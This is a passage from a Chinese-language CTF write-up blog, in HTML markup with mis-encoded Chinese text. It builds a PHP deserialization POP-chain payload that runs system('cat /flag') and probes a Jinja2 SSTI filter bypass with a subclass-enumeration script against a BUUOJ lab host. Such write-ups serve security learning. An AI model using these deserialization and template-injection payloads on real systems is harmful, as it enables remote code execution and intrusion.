class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br>    &#125;<br><br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;Thenfunc&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;*obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;*obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;</span><br><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼šç§æœ‰å˜é‡åºåˆ—åŒ–åä¸å…‰ä¼šåœ¨å˜é‡åå‰åŠ ä¸Šç±»åï¼Œè€Œä¸”è¿˜ä¼šåœ¨ç±»åå‰åå„åŠ ä¸€ä¸ªç©ºç™½å­—ç¬¦<code>%00</code>ã€‚<code>protected</code>å±æ€§å€’ä¸ä¼šåœ¨å˜é‡åå‰åŠ ç±»åï¼Œä½†ä»–ä¼šå…ˆåŠ ä¸€ä¸ª<code>*</code>ï¼Œç„¶ååœ¨<code>*</code>ä¹‹å‰åˆ†åˆ«åŠ ä¸Š<code>%00</code></p><p>æ‰€ä»¥è¦ä¿®æ”¹ä¸ºï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Begin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;name&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Then&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;%00Then%00func&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Super&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;%00*%00obj&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Handle&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;%00*%00obj&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;CTF&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;handle&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;WhiteGod&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;func&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;system&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;var&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">9</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;cat /flag&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ç„¶å<code>post</code>ä¼ <code>pop</code>å°±è¡Œäº†~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//å…¶å®å¦‚æœéƒ½æ˜¯publicçš„è¯å¯ä»¥è¿™æ ·åšï¼Œå¯èƒ½æ›´å¥½ç†è§£ä¸€äº›ï¼ˆä¸è¿‡ç§æœ‰å±æ€§åªèƒ½åœ¨å®šä¹‰å®ƒä»¬çš„ç±»å†…éƒ¨è®¿é—®ï¼Œè€Œä¸èƒ½åœ¨ç±»å¤–éƒ¨æˆ–å­ç±»ä¸­ç›´æ¥è®¿é—®ã€‚ï¼‰ï¼š</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br><span class="hljs-variable">$a</span> -&gt; name = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//ç±»çš„å®ä¾‹è¢«å½“å­—ç¬¦ä¸²ï¼Œè°ƒç”¨tostringå‡½æ•°</span><br><span class="hljs-variable">$b</span> -&gt; func = <span class="hljs-variable">$c</span>;<span class="hljs-comment">//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ç±»ï¼Œè§¦å‘__invokeå‡½æ•°</span><br><span class="hljs-variable">$c</span> -&gt; obj = <span class="hljs-variable">$d</span>;<span class="hljs-comment">//åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è§¦å‘__callå‡½æ•°</span><br><span class="hljs-variable">$d</span> -&gt; obj = <span class="hljs-variable">$e</span>;<span class="hljs-comment">//è§¦å‘CTFç±»ä¸­çš„end()å‡½æ•°ï¼Œè°ƒç”¨unset</span><br><span class="hljs-variable">$e</span> -&gt; handle = <span class="hljs-variable">$f</span>;<br></code></pre></td></tr></table></figure><p>ç†è§£äº†ä¸Šé¢è¿™ä¸ªé“¾å­çš„æ„é€ æ–¹æ³•æ”¹ä¸€æ”¹å†æ”¾è¿›å»å°±è¡Œ,å…¶å®å°±æ˜¯é€šè¿‡ç±»å†…éƒ¨æä¾›çš„å…¬å…±æ–¹æ³•æ¥é—´æ¥è®¿é—®ç§æœ‰å±æ€§ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$privateProperty</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setPrivateProperty</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;privateProperty = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getPrivateProperty</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;privateProperty;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$example</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>();<br><span class="hljs-variable">$example</span>-&gt;<span class="hljs-title function_ invoke__">setPrivateProperty</span>(<span class="hljs-string">&quot;Hello, World!&quot;</span>); <span class="hljs-comment">// é€šè¿‡å…¬å…±æ–¹æ³•é—´æ¥è®¿é—®ç§æœ‰å±æ€§</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$example</span>-&gt;<span class="hljs-title function_ invoke__">getPrivateProperty</span>(); <span class="hljs-comment">// é€šè¿‡å…¬å…±æ–¹æ³•é—´æ¥è®¿é—®ç§æœ‰å±æ€§çš„å€¼</span><br></code></pre></td></tr></table></figure><p>å…¶å®è¿™é¢˜æˆ‘çœ‹ä¸€äº›äººçš„åšæ³•ç›´æ¥<code>urlencode</code>åºåˆ—åŒ–ç»“æœå°±ç›´æ¥ä¼ è¿‡å»äº†ã€‚ã€‚ä½†æ˜¯æˆ‘çš„ä¸æˆåŠŸã€‚ã€‚ä¸çŸ¥é“ä¸ºå•¥:(</p><h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p><img src="/img/genshin1.png" alt="genshin1"></p><p><code>dirsearch</code>æ²¡æ‰«å‡ºæ¥å•¥ï¼Œ<code>bp</code>æŠ“åŒ…å‘ç°è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/genshin4.png" alt="genshin4"></p><p><code>secr3tofpop</code>ï¼Œè®¿é—®å°±è¡Œ</p><p><img src="/img/genshin2.png" alt="genshin2"></p><p><code>node4.buuoj.cn:81/secr3tofpop?name=1</code></p><p><img src="/img/genshin3.png" alt="genshin3"></p><p><code>name</code>çš„å€¼ä¼šå›æ˜¾åˆ°é¡µé¢ä¸Šï¼ŒçŒœæµ‹<code>SSTI</code>ï¼Œå…ˆåˆ¤æ–­ç±»å‹ï¼š</p><p><code>/secr3tofpop?name=$&#123;7*7&#125;</code>ï¼š</p><p><img src="/img/genshin5.png" alt="genshin5"></p><p><code>/secr3tofpop?name=&#123;&#123;7*7&#125;&#125;</code></p><p><img src="/img/genshin6.png" alt="genshin6"></p><p>ç»è¿‡æµ‹è¯•å•ä¸ª<code>&#123;&#125;</code>æ²¡è¢«è¿‡æ»¤ï¼Œä½†<code>&#123;&#123;&#125;&#125;</code>ä¼šè¢«æ£€æµ‹åˆ°ã€‚è€Œä¸”å¼•å·<code>&#39;&#39;</code>ä¹Ÿè¢«è¿‡æ»¤äº†ã€‚</p><p>å¼•å·è¿‡æ»¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ•°ç»„<code>[]</code>æˆ–è€…ç›´æ¥<code>config</code>æ‰¾ä»–çš„çˆ¹ï¼Œè‡³äºåŒæ‹¬å·è¢«è¿‡æ»¤ï¼Œç½‘ä¸Šæ‰¾äº†ç¯‡æ–‡ç« ï¼š</p><p><code>https://blog.csdn.net/weixin_73051164/article/details/132574970</code></p><p><code>?name=&#123;%%20print([].__class__.__base__.__subclasses__())%20%&#125;</code>:</p><p><code>/secr3tofpop?name=%7b%%20print([].__class__.__base__.__subclasses__())%20%%7D</code></p><p><img src="/img/genshin7.png" alt="genshin7"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    url = <span class="hljs-string">&quot;http://3ae9f2a4-38eb-4d14-9b46-74045fd576fb.node4.buuoj.cn:81/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;])%20%&#125;&quot;</span>  <br><br>    s = requests.get(url=url)<br>    time.sleep(<span class="hljs-number">0.06</span>)<br>    <span class="hljs-comment">#print(s.text)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">in</span> s.text:<br>        <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç è¿è¡Œçš„æ—¶å€™ä¼šå‡ºé—®é¢˜ï¼Œæ¯”å¦‚ï¼š</p><p><img src="/img/genshin8.png" alt="genshin8"></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;frame&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;frame-139696630025344&quot;</span>&gt;</span></span><br><span class="language-xml">  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>File </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">cite</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;filename&quot;</span>&gt;</span>&quot;<span class="hljs-symbol">&amp;lt;</span>unknown<span class="hljs-symbol">&amp;gt;</span>&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">cite</span>&gt;</span></span><span class="language-xml">,</span><br><span class="language-xml">      line </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">em</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;line&quot;</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span></span><span class="language-xml">,</span><br><span class="language-xml">      in </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">code</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;function&quot;</span>&gt;</span>template<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;source &quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">blockquote</span>&gt;</span>jinja2.exceptions.TemplateSyntaxError: tag name expected</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">blockquote</span>&gt;</span></span><br>&lt;/div&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;plain&quot;</span>&gt;</span></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">      This is the Copy/Paste friendly version of the traceback.</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;50&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;code&quot;</span> <span class="hljs-attr">readonly</span>&gt;</span>Traceback (most recent call last):</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 2213, in __call__</span><br><span class="language-xml">    return self.wsgi_app(environ, start_response)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 2193, in wsgi_app</span><br><span class="language-xml">    response = self.handle_exception(e)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 2190, in wsgi_app</span><br><span class="language-xml">    response = self.full_dispatch_request()</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 1486, in full_dispatch_request</span><br><span class="language-xml">    rv = self.handle_user_exception(e)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 1484, in full_dispatch_request</span><br><span class="language-xml">    rv = self.dispatch_request()</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 1469, in dispatch_request</span><br><span class="language-xml">    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/app/app.py<span class="hljs-symbol">&amp;#34;</span>, line 21, in hello</span><br><span class="language-xml">    return render_template_string(sign_in)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/templating.py<span class="hljs-symbol">&amp;#34;</span>, line 162, in render_template_string</span><br><span class="language-xml">    template = app.jinja_env.from_string(source)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/jinja2/environment.py<span class="hljs-symbol">&amp;#34;</span>, line 1105, in from_string</span><br><span class="language-xml">    return cls.from_code(self, self.compile(source), gs, None)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/jinja2/environment.py<span class="hljs-symbol">&amp;#34;</span>, line 768, in compile</span><br><span class="language-xml">    self.handle_exception(source=source_hint)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/jinja2/environment.py<span class="hljs-symbol">&amp;#34;</span>, line 936, in handle_exception</span><br><span class="language-xml">    raise rewrite_traceback_stack(source=source)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span><span class="hljs-symbol">&amp;lt;</span>unknown<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;#34;</span>, line 2, in template</span><br><span class="language-xml">jinja2.exceptions.TemplateSyntaxError: tag name expected</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br>&lt;/div&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;explanation&quot;</span>&gt;</span></span><br><span class="language-xml">  The debugger caught an exception in your WSGI application.  You can now</span><br><span class="language-xml">  look at the traceback which led to the error.  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nojavascript&quot;</span>&gt;</span></span><br><span class="language-xml">  If you enable JavaScript you can also use additional features such as code</span><br><span class="language-xml">  execution (if the evalex feature is enabled), automatic pasting of the</span><br><span class="language-xml">  exceptions and much more.<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer&quot;</span>&gt;</span></span><br><span class="language-xml">        Brought to you by </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;arthur&quot;</span>&gt;</span>DON&#x27;T PANIC<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span></span><span class="language-xml">, your</span><br><span class="language-xml">        friendly Werkzeug powered traceback interpreter.</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    &lt;/div&gt;<br><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pin-prompt&quot;</span>&gt;</span></span><br><span class="language-xml">      </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inner&quot;</span>&gt;</span></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Console Locked<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">          The console is locked and needs to be unlocked by entering the PIN.</span><br><span class="language-xml">          You can find the PIN printed out on the standard output of your</span><br><span class="language-xml">          shell that runs the server.</span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml">          </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>PIN:</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">text</span> <span class="hljs-attr">name</span>=<span class="hljs-string">pin</span> <span class="hljs-attr">size</span>=<span class="hljs-string">14</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">btn</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Confirm Pin&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span 